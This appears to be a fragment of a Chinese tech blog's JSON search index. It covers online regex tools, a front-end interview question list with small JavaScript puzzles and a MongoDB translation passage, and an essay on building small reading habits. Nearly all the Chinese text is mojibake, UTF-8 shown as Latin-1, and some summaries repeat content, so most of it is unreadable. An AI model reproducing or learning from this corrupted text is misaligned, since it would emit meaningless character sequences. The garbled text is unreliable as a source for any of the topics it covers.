å¯è§†åŒ–æ­£åˆ™ç»˜å›¾ï¼šregexper ä¼˜ç‚¹ï¼š\næ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ç»˜å›¾ é¡µé¢åŠ è½½é€Ÿåº¦å¿« ç¼ºç‚¹ï¼š\næ— æ³•å®æ—¶ç»˜å›¾ï¼Œéœ€è¦ç‚¹å‡»æ‰å¯ä»¥ 4. ä¸“æ³¨äºpythonæ­£åˆ™ï¼špyregex ä¸“æ³¨python é¡µé¢åŠ è½½é€Ÿåº¦å¿« ","permalink":"https://wdd.js.org/posts/2018/02/regex-online-tools/","summary":"1. åŠŸèƒ½æœ€å¼ºï¼šregex101 ä¼˜ç‚¹ï¼š\næ”¯æŒå¤šç§è¯­è¨€, prec,php,javascript,python,golang ç•Œé¢ç¾è§‚å¤§æ–¹ æ”¯æŒé”™è¯¯æç¤ºï¼Œå®æ—¶åŒ¹é… ç¼ºç‚¹ï¼š\næœ‰æ—¶å€™åŠ è½½é€Ÿåº¦å¤ªæ…¢ 2. å¯è§†åŒ–æ­£åˆ™ç»˜å›¾: Regulex ä¼˜ç‚¹ï¼š\nå®æ—¶æ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ç»˜å›¾ é¡µé¢åŠ è½½é€Ÿåº¦å¿« 3. å¯è§†åŒ–æ­£åˆ™ç»˜å›¾ï¼šregexper ä¼˜ç‚¹ï¼š\næ ¹æ®æ­£åˆ™è¡¨è¾¾å¼ç»˜å›¾ é¡µé¢åŠ è½½é€Ÿåº¦å¿« ç¼ºç‚¹ï¼š\næ— æ³•å®æ—¶ç»˜å›¾ï¼Œéœ€è¦ç‚¹å‡»æ‰å¯ä»¥ 4. ä¸“æ³¨äºpythonæ­£åˆ™ï¼špyregex ä¸“æ³¨python é¡µé¢åŠ è½½é€Ÿåº¦å¿« ","title":"æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿å·¥å…·é›†åˆ"},{"content":"1. é—®ç­”é¢˜ 1.1. HTMLç›¸å…³ 1.1.1. çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ 1.1.2. script, script asyncå’Œscript deferä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 1.1.3. cookie, sessionStorage å’Œ localStorageä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 1.1.4. ç”¨è¿‡å“ªäº›htmlæ¨¡æ¿æ¸²æŸ“å·¥å…·ï¼Ÿ 1.2. CSSç›¸å…³ 1.2.1. ç®€è¿°CSSç›’å­æ¨¡å‹ 1.2.2. CSSæœ‰å“ªäº›é€‰æ‹©å™¨ï¼Ÿ 1.2.3. CSS spriteæ˜¯ä»€ä¹ˆï¼Ÿ 1.2.4. å†™ä¸€ä¸‹ä½ çŸ¥é“çš„å‰ç«¯UIæ¡†æ¶ï¼Ÿ 1.3. JSç›¸å…³ 1.3.1. jsæœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿ 1.3.2. jsæœ‰å“ªäº›å‡å€¼ï¼Ÿ 1.3.3. jsæ•°å­—å’Œå­—ç¬¦ä¸²ä¹‹é—´æœ‰ä»€ä¹ˆå¿«é€Ÿè½¬æ¢çš„å†™æ³•ï¼Ÿ 1.3.4. ç»å¸¸ä½¿ç”¨å“ªäº›ES6çš„è¯­æ³•ï¼Ÿ 1.3.5. ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ï¼Ÿ 1.3.6. è·¨åŸŸæœ‰å“ªäº›è§£å†³æ–¹æ³•ï¼Ÿ 1.3.7. ç½‘é¡µè¿›åº¦æ¡å®ç°çš„åŸç† 1.3.8. è¯·é—®console.logæ˜¯åŒæ­¥çš„ï¼Œè¿˜æ˜¯å¼‚æ­¥çš„ï¼Ÿ 1.3.9. ä¸‹é¢consoleè¾“å‡ºçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ var scores = [10,11,12]; var total = 0; for(var score in scores){ total += score; } var average = total/scores.length; console.log(average); 1.3.10. è¯·é—®ä¸‹é¢çš„å†™æ³•é—®é¢˜åœ¨å“ªï¼Ÿ console.log(1) (function(){ console.log(1) })() 1.3.11. è¯·é—®s.lengthæ˜¯å¤šå°‘ï¼Œs[2]æ˜¯å¤šå°‘ var s = [] s[3] = 4 s.length ? s[2] ? 1.3.12. è¯´è¯´ä½ å¯¹setTimeoutçš„æ·±å…¥ç†è§£ï¼Ÿ setTimeout(function(){ console.log(\u0026#39;hi\u0026#39;) }, 1000) 1.3.13. è§£é‡Šé—­åŒ…æ¦‚å¿µåŠå…¶ä½œç”¨ 1.3.14. å¦‚ä½•ç†è§£js å‡½æ•°first classçš„æ¦‚å¿µï¼Ÿ 1.3.15. å‡½æ•°æœ‰å“ªäº›è°ƒç”¨æ–¹å¼ï¼Ÿä¸åŒthisçš„ä¼šæŒ‡å‘å“ªé‡Œï¼Ÿ 1.3.16. appllyå’Œcallæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 1.3.17. å‡½æ•°çš„lengthå±æ€§çš„ä»£è¡¨ä»€ä¹ˆï¼Ÿ 1.3.18. æœ‰ç”¨è¿‡å“ªäº›jsç¼–ç¨‹é£æ ¼ 1.3.19. å¦‚ä½•ç†è§£EventLoop? 1.3.20. ä½¿ç”¨è¿‡å“ªäº›æ„å»ºå·¥å…·ï¼Ÿå„æœ‰ä»€ä¹ˆä¼˜ç¼ºç‚¹ï¼Ÿ 1.4. å…¶å®ƒ 1.4.1. å¹³æ—¶ä½¿ç”¨ä»€ä¹ˆæœç´¢å¼•æ“æŸ¥èµ„æ–™ï¼Ÿ 1.4.2. å¯¹ç¿»å¢™æœ‰ä»€ä¹ˆçœ‹æ³•ï¼Ÿå¦‚ä½•ç¿»å¢™ï¼Ÿ 1.4.3. ä¸ªäººæœ‰æ²¡æœ‰æŠ€æœ¯åšå®¢ï¼Œåœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ 1.4.4. githubä¸Šæœ‰æ²¡æœ‰é¡¹ç›®ï¼Ÿ 1.5. ç½‘ç»œç›¸å…³ 1.5.1. è¯·æ±‚çŠ¶æ€ç  1xx,2xx,3xx,4xx,5xxåˆ†åˆ«æœ‰ä»€ä¹ˆå«ä¹‰ï¼Ÿ 1.5.2. å‘é€æŸäº›postè¯·æ±‚æ—¶ï¼Œæœ‰æ—¶ä¼šå¤šä¸€äº›optionsè¯·æ±‚ï¼Œè¯·é—®è¿™æ˜¯ä¸ºä»€ä¹ˆï¼Ÿ 1.5.3. httpæŠ¥æ–‡æœ‰å“ªäº›ç»„æˆéƒ¨åˆ†ï¼Ÿ 1.5.4. httpç«¯åˆ°ç«¯é¦–éƒ¨å’Œé€è·³é¦–éƒ¨æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 1.5.5. httpä¸httpsåœ¨åŒæ—¶ä½¿ç”¨æ—¶ï¼Œæœ‰ä»€ä¹ˆæ³¨æ„ç‚¹ï¼Ÿ 1.5.6. http, tcp, udp, websocketï¼Œåˆ†åˆ«ä½äº7å±‚ç½‘ç»œçš„é‚£ä¸€å±‚ï¼Ÿtcpå’Œudpæœ‰ä»€ä¹ˆä¸åŒï¼Ÿ 2. ç¼–ç é¢˜ 2.1. å†™ä¸€ä¸ªå‡½æ•°ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ è¢«ç¬¬ä¸€ä¸ªå…ƒç´ é™¤åçš„ç»“æœ 2.2. å†™ä¸€ä¸ªå‡½æ•°ï¼Œæ¥åˆ¤æ–­å˜é‡æ˜¯å¦æ˜¯æ•°ç»„ï¼Œè‡³å°‘ä½¿ç”¨ä¸¤ç§å†™æ³• 2.3. å†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†ç§’è½¬åŒ–æˆæ—¶åˆ†ç§’æ ¼å¼ï¼Œå¦‚80è½¬åŒ–æˆï¼š00:01:20 å†™ä¸€ä¸ªå‡½æ•°ï¼Œå°†å¯¹è±¡ä¸­å±æ€§å€¼ä¸º\u0026rsquo;\u0026rsquo;, undefined, nullçš„å±æ€§åˆ é™¤æ‰ // å¤„ç†å‰ var obj = { name: \u0026#39;wdd\u0026#39;, address: { code: \u0026#39;\u0026#39;, tt: null, age: 1 }, ss: [], vv: undefined } // å¤„ç†å { name: \u0026#39;wdd\u0026#39;, address: { age: 1 }, ss: [] } 3. ç¿»è¯‘é¢˜ Aggregation operations process data records and return computed results. Aggregation operations group values from multiple documents together, and can perform a variety of operations on the grouped data to return a single result. MongoDB provides three ways to perform aggregation: the aggregation pipeline, the map-reduce function, and single purpose aggregation methods.\n","permalink":"https://wdd.js.org/posts/2018/02/front-end-interview-handbook/","summary":"1. é—®ç­”é¢˜ 1.1. HTMLç›¸å…³ 1.1.1. çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ 1.1.2. script, script asyncå’Œscript deferä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 1.1.3. cookie, sessionStorage å’Œ localStorageä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ 1.1.4. ç”¨è¿‡å“ªäº›htmlæ¨¡æ¿æ¸²æŸ“å·¥å…·ï¼Ÿ 1.2. CSSç›¸å…³ 1.2.1. ç®€è¿°CSSç›’å­æ¨¡å‹ 1.2.2. CSSæœ‰å“ªäº›é€‰æ‹©å™¨ï¼Ÿ 1.2.3. CSS spriteæ˜¯ä»€ä¹ˆï¼Ÿ 1.2.4. å†™ä¸€ä¸‹ä½ çŸ¥é“çš„å‰ç«¯UIæ¡†æ¶ï¼Ÿ 1.3. JSç›¸å…³ 1.3.1. jsæœ‰å“ªäº›æ•°æ®ç±»å‹ï¼Ÿ 1.3.2. jsæœ‰å“ªäº›å‡å€¼ï¼Ÿ 1.3.3. jsæ•°å­—å’Œå­—ç¬¦ä¸²ä¹‹é—´æœ‰ä»€ä¹ˆå¿«é€Ÿè½¬æ¢çš„å†™æ³•ï¼Ÿ 1.3.4. ç»å¸¸ä½¿ç”¨å“ªäº›ES6çš„è¯­æ³•ï¼Ÿ 1.3.5. ä»€ä¹ˆæ˜¯åŒæºç­–ç•¥ï¼Ÿ 1.3.6. è·¨åŸŸæœ‰å“ªäº›è§£å†³æ–¹æ³•ï¼Ÿ 1.3.7. ç½‘é¡µè¿›åº¦æ¡å®ç°çš„åŸç† 1.3.8. è¯·é—®console.logæ˜¯åŒæ­¥çš„ï¼Œè¿˜æ˜¯å¼‚æ­¥çš„ï¼Ÿ 1.3.9. ä¸‹é¢consoleè¾“å‡ºçš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ var scores = [10,11,12]; var total = 0; for(var score in scores){ total += score; } var average = total/scores.length; console.log(average); 1.","title":"å‰ç«¯é¢è¯•å’Œç¬”è¯•é¢˜ç›®"},{"content":"åºŠåº•ä¸‹ç§˜å¯† æˆ‘æ˜¯ä¸€ä¸ªæ¯…åŠ›ä¸æ˜¯å¾ˆå¤Ÿçš„äººã€‚æˆ‘æ›¾ç»ä¸‹å®šå†³å¿ƒè¦é”»ç‚¼èº«ä½“ï¼Œä¹°äº†ä¸€äº›å¥èº«å™¨æï¼Œä¾‹å¦‚ç‘œä¼½å«ï¼Œä»°å§èµ·åçš„å™¨æï¼Œä¿¯å§æ’‘çš„å™¨æã€‚ç„¶è€Œä¸‰åˆ†é’Ÿçš„çƒ­åº¦è¿‡åï¼Œæˆ‘æŠŠç‘œä¼½å«å·äº†èµ·æ¥ï¼Œå¡åˆ°åºŠåº•ä¸‹ã€‚æŠŠä»°å§èµ·åçš„å™¨ææ‹†å¼€ï¼Œä¹Ÿå¡åˆ°äº†åºŠåº•ä¸‹ã€‚\næ‰€ä»¥æ¯æ¬¡æˆ‘éƒ½ä¸æ•¢çœ‹åºŠåº•ä¸‹ï¼Œé‚£é‡Œå¡æ»¡äº†æˆ‘çš„ç¾æ„§ã€‚æˆ‘å¸¸å¸¸æƒ³ï¼Œæˆ‘è¿™ä¸å°±æ˜¯æ°¸è¿œç¡åœ¨ç¾æ„§ä¹‹ä¸Šå—ï¼Ÿ\né‚£ä¹ˆï¼Œæ˜¯ä»€ä¹ˆè®©æˆ‘æ”¾å¼ƒäº†è‡ªå·±çš„ç›®æ ‡ï¼Œæ…¢æ…¢æ´»æˆäº†è‡ªå·±è®¨åŒçš„æ ·å­å‘¢ï¼Ÿ\nä¹‹å‰å’Œæœ‹å‹èŠå¤©ï¼Œæˆ‘ä»¬æœ‰ä¸€æ®µæ—¶é—´æ²¡è§äº†ã€‚æˆ‘çªç„¶è§‰å¾—ä»–ä¹Ÿå¤ªèƒ½èŠäº†ï¼Œè¯´äº†å¾ˆå¤šæˆ‘ä¸çŸ¥é“çš„æ–°é²œäº‹ï¼Œè¿˜æœ‰ä¸€äº›å¯ä»¥è®©äººèŒ…å¡é¡¿å¼€çš„æƒ³æ³•ã€‚å®Œäº†ä¹‹åï¼Œä»–åŠæˆ‘è®©æˆ‘å¤šè¯»ä¹¦ã€‚æˆ‘è§‰å¾—è¿™ä¸ªæƒ³æ³•å¾ˆå¤šã€‚æˆ‘æ˜¯ç¡®å®éœ€è¦è¯»ä¹¦äº†ã€‚æ¯•ç«Ÿæˆ‘çš„åºŠåº•ä¸‹å·²ç»æ²¡æœ‰ç©ºé—´å†å¡å…¶ä»–çš„ä¸œè¥¿äº†ã€‚\näºæ˜¯æˆ‘åœ¨å¤šçœ‹é˜…è¯»ä¸Šä¹°äº†ä¸€ä¸‹ç”µå­ä¹¦ï¼Œåœ¨äº¬ä¸œä¸Šä¹°äº†ä¸€äº›å®ä½“ä¹¦ï¼Œç„¶ååˆä¹°äº†ä¸€ä¸ªkindleã€‚åœ¨è¯»ä¹¦çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™ä½œè€…ä¹Ÿä¼šæ¨èä½ çœ‹ä¸€äº›å…¶ä»–çš„ä¹¦ã€‚æˆ‘ç»™è‡ªå·±å®šäº†2018å¹´æˆ‘çš„é˜…è¯»è®¡åˆ’ï¼Œç»™è‡ªå·±å®šä¸‹è¦çœ‹å“ªäº›ä¹¦ã€‚\nçœ‹ä¹¦çš„æ–¹æ³• å½“æˆ‘å†³å®šè¦çœ‹ä¹¦ï¼Œå¹¶ä¸”ä¸ºæ­¤ä»˜å‡ºäº†ä¸å°‘çš„é‡‘é’±çš„æƒ…å†µä¸‹ã€‚æˆ‘æ˜¯éå¸¸ä¸æ„¿å› è®©æˆ‘çš„é‡‘é’±çš„ä»˜å‡ºç™½ç™½æ‰“æ°´æ¼‚çš„ï¼Œæ¯•ç«Ÿä¹°ä¹¦ä»¥åŠä¹°è®¾å¤‡ï¼Œè¿™ä¸æ˜¯å…è´¹çš„æœåŠ¡ã€‚äºæ˜¯æˆ‘ç»™è‡ªå·±æŒ‡å®šäº†ä¸€ä¸ªéå¸¸å®Œå–„çš„å®šé‡é˜…è¯»æ ‡å‡†\nè¯»ä¹¦æ–¹æ³•v1.0.0 ç‰ˆ å¦‚ä¸‹\næ¯å¤©è‡³å°‘çœ‹ä¸‰æœ¬ä¹¦ æ¯æœ¬ä¹¦çœ‹50é¡µ äººè¦æœ‰æ ‡å‡†æ‰èƒ½åˆ¤æ–­æ˜¯å¦è¾¾æ ‡ï¼Œæ²¡æœ‰æ ‡å‡†ï¼Œæ²¡æœ‰æ•°å­—åŒ–çš„æ”¯æ’‘ï¼Œé‚£æ˜¯å¾ˆéš¾ä»¥æŒç»­çš„ã€‚æ¯”å¦‚è¯´ä¸­å›½çš„èœè°±ï¼ŒåšæŸé“èœä¸­å†™äº†ä¸€å¥ï¼šåŠ å…¥å°‘è®¸ç›ã€‚ä¸­å›½äººçœ‹äº†ä¼šæƒ³ï¼Œé‚£æˆ‘å°±æŒ‰ç…§å£å‘³éšä¾¿åŠ ç‚¹ç›å§ã€‚å¤–å›½äººå°±ä¼šè¢«æå¾—éå¸¸è¿·ç³Šï¼Œå°‘è®¸æ˜¯å¤šå°‘å…‹ç›ï¼Ÿ 20g, 30g? å®Œå…¨æ²¡æœ‰æ ‡å‡†å˜›ã€‚\næŒ‰ç…§è¯»ä¹¦æ–¹æ³• v1.0.0ç‰ˆï¼Œæˆ‘çœ‹äº†å‡ å¤©ï¼Œè¿™ä¸ªæ•ˆæœæ˜¯å¾ˆå¥½çš„ã€‚ä½†æ˜¯æˆ‘å¾ˆç´¯ï¼Œç”µå­ä¹¦50é¡µå¯ä¸æ˜¯ä¸ªå°æ•°ç›®ã€‚æœ‰æ—¶å€™å¾ˆéš¾å®Œæˆçš„ã€‚äºæ˜¯æˆ‘å¿…é¡»è¦å‡çº§æˆ‘çš„è¯»ä¹¦æ–¹æ³•ã€‚\nè¯»ä¹¦æ–¹æ³•v1.0.1 ç‰ˆ å¦‚ä¸‹\næ¯å¤©è‡³å°‘çœ‹ä¸‰æœ¬ä¹¦ æ¯æœ¬ä¹¦çœ‹10é¡µ æŒ‰ç…§è¯»ä¹¦æ–¹æ³•v1.0.1 ç‰ˆï¼Œæˆ‘çœ‹äº†å‡ å¤©ï¼Œè™½ç„¶è¯»ä¹¦çš„è¿›åº¦å¾ˆæ…¢ï¼Œä½†æ˜¯æˆ‘å¾ˆå®¹æ˜“æœ‰æ»¡è¶³æ„Ÿï¼Œå› ä¸ºè¿™ä¸ªç›®æ ‡æ˜¯å¾ˆå®¹æ˜“å°±è¾¾æˆçš„ã€‚å› ä¸ºä½ éšä¾¿å»ä¸Šä¸ªå•æ‰€ï¼Œçœ‹ä¸ª10é¡µç”µå­ä¹¦ä¹Ÿæ˜¯ç»°ç»°æœ‰ä½™çš„ã€‚ä½†æ˜¯è¿™ä¸ªç‰ˆæœ¬ä¹Ÿæœ‰ä¸ªé—®é¢˜ã€‚\nå¦‚æœæˆ‘ä»Šå¤©çœ‹çš„è¿™æœ¬ä¹¦çœ‹çš„æµè¿å¿˜è¿”ï¼Œä¸€ä¸å°å¿ƒå¿˜è®°çœ‹é¡µç äº†ï¼Œå±…ç„¶ä¸çŸ¥ä¸è§‰è¯»äº†38é¡µï¼Œé‚£ä¹ˆæ˜¯ä¸æ˜¯å·²ç»æ¶ˆè€—äº†æœªæ¥å‡ å¤©çš„é˜…è¯»é‡å‘¢ï¼Œæ˜å¤©è¿™æœ¬ä¹¦è¦ä¸è¦åº¦å‘¢ï¼Ÿ æ‰€ä»¥ï¼Œæˆ‘è¦å‡çº§æˆ‘çš„è¯»ä¹¦æ–¹æ³•ã€‚\nè¯»ä¹¦æ–¹æ³•v1.0.2ç‰ˆï¼š\næ¯å¤©è‡³å°‘è¯»ä¸‰æœ¬ä¹¦ æ¯æœ¬ä¹¦è‡³å°‘è¯»10é¡µ æˆ‘æŒ‰ç…§è¿™ä¸ªæ–¹æ³•ï¼Œæ„Ÿè§‰åšçš„ä¸é”™ã€‚æ¯å¤©éƒ½æœ‰ä¸€å®šçš„é˜…è¯»é‡è¦çœ‹ï¼Œè€Œä¸”é˜…è¯»é‡ä¸æ˜¯å¾ˆå¤§ï¼Œä¸ä¼šè®©æˆ‘è§‰å¾—å¾ˆç´¯ã€‚è€Œä¸”å½“æˆ‘å®Œæˆäº†è¿™ä¸ªç›®æ ‡ï¼Œæˆ‘æ˜¯ä¼šè·å¾—ä¸å°çš„æ»¡è¶³æ„Ÿã€‚\nå¤§ç›®æ ‡åˆ†è§£æˆå°ç›®æ ‡å»é€ä¸ªå‡»ç ´ï¼Œè¿™æ˜¯æˆ‘è¿™ç¯‡æ–‡ç« çš„æ ¸å¿ƒè§‚ç‚¹ã€‚\nå†²é‡å…¬å¼ I = F x T å†²é‡æ˜¯åŠ›çš„æ—¶é—´ç´¯ç§¯æ•ˆåº”çš„é‡åº¦ï¼Œæ˜¯çŸ¢é‡ã€‚å¦‚æœç‰©ä½“æ‰€å—çš„åŠ›æ˜¯å¤§å°å’Œæ–¹å‘éƒ½ä¸å˜çš„æ’åŠ›Fï¼Œå†²é‡Iå°±æ˜¯Få’Œä½œç”¨æ—¶é—´tçš„ä¹˜ç§¯ã€‚ å†²é‡æ˜¯æè¿°åŠ›å¯¹ç‰©ä½“ä½œç”¨çš„æ—¶é—´ç´¯ç§¯æ•ˆåº”çš„ç‰©ç†é‡ã€‚åŠ›çš„å†²é‡æ˜¯ä¸€ä¸ªè¿‡ç¨‹é‡ã€‚åœ¨è°ˆåŠå†²é‡æ—¶ï¼Œå¿…é¡»æ˜ç¡®æ˜¯å“ªä¸ªåŠ›åœ¨å“ªæ®µæ—¶é—´ä¸Šçš„å†²é‡ã€‚\nä¸ªäººå¥½ä¹ æƒ¯çš„å…»æˆï¼Œä¸æ˜¯ä¸€è¹´è€Œå°±çš„ï¼Œè€Œæ˜¯ç±»ä¼¼äºç‰©ç†å­¦å†²é‡çš„æ¦‚å¿µï¼šåŠ›åœ¨ä¸€æ®µæ—¶é—´å†…çš„ç´¯ç§¯ï¼Œæ˜¯è¿‡ç¨‹é‡\nä¸‰åˆ†é’Ÿçš„çƒ­åº¦å¯¹åº”çš„å†²é‡ï¼šI = F_max x T_minã€‚ä½¿ç”¨å¾ˆå¤§çš„åŠ›ï¼Œä½œç”¨æ—¶é—´è¶…çŸ­ï¼ŒåŸºæœ¬ä¸Šæ²¡å•¥æ•ˆæœï¼Œå†²é‡è¶‹è¿‘äºé›¶ã€‚\nå¾®ä¹ æƒ¯å¯¹åº”çš„å†²é‡ï¼šI = F_min x T_maxã€‚ä½¿ç”¨å¾ˆå°çš„åŠ›ï¼Œåšé•¿æ—¶é—´çš„ç§¯ç´¯ã€‚å†²é‡ä¸ä¼šè¶‹è¿‘äºé›¶ï¼Œè€Œæ˜¯ä¼šæ…¢æ…¢å¢é•¿ï¼Œç„¶åè¶‹è¿‘äºä¸€ä¸ªç¨³å®šæ°´å¹³ã€‚æ¯”å¦‚ä½ ç»™è‡ªå·±è§„å®šæ¯å¤©çœ‹1é¡µä¹¦ï¼Œä½†æ˜¯å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¦‚æœä½ åšäº†çœ‹ä¹¦çš„åŠ¨ä½œï¼ŒåŸºæœ¬ä¸Šä½ çœ‹ä¹¦çš„é¡µæ•°ä¸€å®šä¼šå¤§äº1é¡µã€‚\nçœ‹ä»€ä¹ˆæ ·çš„ä¹¦ æˆ‘è‡ªå·±å–œæ¬¢çœ‹è®¡ç®—æœºï¼Œå¿ƒç†å­¦ï¼Œå†å²äººæ–‡æ–¹é¢çš„å‡ºç‰ˆä¹¦ç±ã€‚è€Œæˆ‘çš„é€‰æ‹©æ ‡å‡†æœ‰ä¸¤ä¸ªï¼Œç¬¦åˆä»»ä¸€ä¸€ä¸ªï¼Œæˆ‘éƒ½ä¼šå»çœ‹ã€‚\nè¦æœ‰ç”¨ã€‚æ— è®ºæ˜¯å¯¹æˆ‘çš„ä¸“ä¸šçŸ¥è¯†ï¼Œè¿˜æ˜¯å¯¹äººé™…äº¤å¾€ï¼Œé‡‘èç†è´¢ç­‰æ–¹é¢è¦ç”¨æœ‰ç›Šä¹‹å¤„ è¦æœ‰è¶£ã€‚æ²¡è¶£çš„ä¹¦æˆ‘æ˜¯æ–­ç„¶ä¸ä¼šå»çœ‹çš„ã€‚ è¯»ä¹¦å®é™…ä¸Šæ˜¯è¯»äººï¼Œä¸€æµä½œå®¶å†™çš„ä¸€æµçš„ä¹¦ï¼Œä¸‰æµä½œå®¶åªèƒ½å†™å‡ºä¹æµçš„ä¹¦ã€‚\n","permalink":"https://wdd.js.org/posts/2018/02/small-is-better-than-big/","summary":"åºŠåº•ä¸‹ç§˜å¯† æˆ‘æ˜¯ä¸€ä¸ªæ¯…åŠ›ä¸æ˜¯å¾ˆå¤Ÿçš„äººã€‚æˆ‘æ›¾ç»ä¸‹å®šå†³å¿ƒè¦é”»ç‚¼èº«ä½“ï¼Œä¹°äº†ä¸€äº›å¥èº«å™¨æï¼Œä¾‹å¦‚ç‘œä¼½å«ï¼Œä»°å§èµ·åçš„å™¨æï¼Œä¿¯å§æ’‘çš„å™¨æã€‚ç„¶è€Œä¸‰åˆ†é’Ÿçš„çƒ­åº¦è¿‡åï¼Œæˆ‘æŠŠç‘œä¼½å«å·äº†èµ·æ¥ï¼Œå¡åˆ°åºŠåº•ä¸‹ã€‚æŠŠä»°å§èµ·åçš„å™¨ææ‹†å¼€ï¼Œä¹Ÿå¡åˆ°äº†åºŠåº•ä¸‹ã€‚\næ‰€ä»¥æ¯æ¬¡æˆ‘éƒ½ä¸æ•¢çœ‹åºŠåº•ä¸‹ï¼Œé‚£é‡Œå¡æ»¡äº†æˆ‘çš„ç¾æ„§ã€‚æˆ‘å¸¸å¸¸æƒ³ï¼Œæˆ‘è¿™ä¸å°±æ˜¯æ°¸è¿œç¡åœ¨ç¾æ„§ä¹‹ä¸Šå—ï¼Ÿ\né‚£ä¹ˆï¼Œæ˜¯ä»€ä¹ˆè®©æˆ‘æ”¾å¼ƒäº†è‡ªå·±çš„ç›®æ ‡ï¼Œæ…¢æ…¢æ´»æˆäº†è‡ªå·±è®¨åŒçš„æ ·å­å‘¢ï¼Ÿ\nä¹‹å‰å’Œæœ‹å‹èŠå¤©ï¼Œæˆ‘ä»¬æœ‰ä¸€æ®µæ—¶é—´æ²¡è§äº†ã€‚æˆ‘çªç„¶è§‰å¾—ä»–ä¹Ÿå¤ªèƒ½èŠäº†ï¼Œè¯´äº†å¾ˆå¤šæˆ‘ä¸çŸ¥é“çš„æ–°é²œäº‹ï¼Œè¿˜æœ‰ä¸€äº›å¯ä»¥è®©äººèŒ…å¡é¡¿å¼€çš„æƒ³æ³•ã€‚å®Œäº†ä¹‹åï¼Œä»–åŠæˆ‘è®©æˆ‘å¤šè¯»ä¹¦ã€‚æˆ‘è§‰å¾—è¿™ä¸ªæƒ³æ³•å¾ˆå¤šã€‚æˆ‘æ˜¯ç¡®å®éœ€è¦è¯»ä¹¦äº†ã€‚æ¯•ç«Ÿæˆ‘çš„åºŠåº•ä¸‹å·²ç»æ²¡æœ‰ç©ºé—´å†å¡å…¶ä»–çš„ä¸œè¥¿äº†ã€‚\näºæ˜¯æˆ‘åœ¨å¤šçœ‹é˜…è¯»ä¸Šä¹°äº†ä¸€ä¸‹ç”µå­ä¹¦ï¼Œåœ¨äº¬ä¸œä¸Šä¹°äº†ä¸€äº›å®ä½“ä¹¦ï¼Œç„¶ååˆä¹°äº†ä¸€ä¸ªkindleã€‚åœ¨è¯»ä¹¦çš„è¿‡ç¨‹ä¸­ï¼Œæœ‰æ—¶å€™ä½œè€…ä¹Ÿä¼šæ¨èä½ çœ‹ä¸€äº›å…¶ä»–çš„ä¹¦ã€‚æˆ‘ç»™è‡ªå·±å®šäº†2018å¹´æˆ‘çš„é˜…è¯»è®¡åˆ’ï¼Œç»™è‡ªå·±å®šä¸‹è¦çœ‹å“ªäº›ä¹¦ã€‚\nçœ‹ä¹¦çš„æ–¹æ³• å½“æˆ‘å†³å®šè¦çœ‹ä¹¦ï¼Œå¹¶ä¸”ä¸ºæ­¤ä»˜å‡ºäº†ä¸å°‘çš„é‡‘é’±çš„æƒ…å†µä¸‹ã€‚æˆ‘æ˜¯éå¸¸ä¸æ„¿å› è®©æˆ‘çš„é‡‘é’±çš„ä»˜å‡ºç™½ç™½æ‰“æ°´æ¼‚çš„ï¼Œæ¯•ç«Ÿä¹°ä¹¦ä»¥åŠä¹°è®¾å¤‡ï¼Œè¿™ä¸æ˜¯å…è´¹çš„æœåŠ¡ã€‚äºæ˜¯æˆ‘ç»™è‡ªå·±æŒ‡å®šäº†ä¸€ä¸ªéå¸¸å®Œå–„çš„å®šé‡é˜…è¯»æ ‡å‡†\nè¯»ä¹¦æ–¹æ³•v1.0.0 ç‰ˆ å¦‚ä¸‹\næ¯å¤©è‡³å°‘çœ‹ä¸‰æœ¬ä¹¦ æ¯æœ¬ä¹¦çœ‹50é¡µ äººè¦æœ‰æ ‡å‡†æ‰èƒ½åˆ¤æ–­æ˜¯å¦è¾¾æ ‡ï¼Œæ²¡æœ‰æ ‡å‡†ï¼Œæ²¡æœ‰æ•°å­—åŒ–çš„æ”¯æ’‘ï¼Œé‚£æ˜¯å¾ˆéš¾ä»¥æŒç»­çš„ã€‚æ¯”å¦‚è¯´ä¸­å›½çš„èœè°±ï¼ŒåšæŸé“èœä¸­å†™äº†ä¸€å¥ï¼šåŠ å…¥å°‘è®¸ç›ã€‚ä¸­å›½äººçœ‹äº†ä¼šæƒ³ï¼Œé‚£æˆ‘å°±æŒ‰ç…§å£å‘³éšä¾¿åŠ ç‚¹ç›å§ã€‚å¤–å›½äººå°±ä¼šè¢«æå¾—éå¸¸è¿·ç³Šï¼Œå°‘è®¸æ˜¯å¤šå°‘å…‹ç›ï¼Ÿ 20g, 30g? å®Œå…¨æ²¡æœ‰æ ‡å‡†å˜›ã€‚\næŒ‰ç…§è¯»ä¹¦æ–¹æ³• v1.0.0ç‰ˆï¼Œæˆ‘çœ‹äº†å‡ å¤©ï¼Œè¿™ä¸ªæ•ˆæœæ˜¯å¾ˆå¥½çš„ã€‚ä½†æ˜¯æˆ‘å¾ˆç´¯ï¼Œç”µå­ä¹¦50é¡µå¯ä¸æ˜¯ä¸ªå°æ•°ç›®ã€‚æœ‰æ—¶å€™å¾ˆéš¾å®Œæˆçš„ã€‚äºæ˜¯æˆ‘å¿…é¡»è¦å‡çº§æˆ‘çš„è¯»ä¹¦æ–¹æ³•ã€‚\nè¯»ä¹¦æ–¹æ³•v1.0.1 ç‰ˆ å¦‚ä¸‹\næ¯å¤©è‡³å°‘çœ‹ä¸‰æœ¬ä¹¦ æ¯æœ¬ä¹¦çœ‹10é¡µ æŒ‰ç…§è¯»ä¹¦æ–¹æ³•v1.0.1 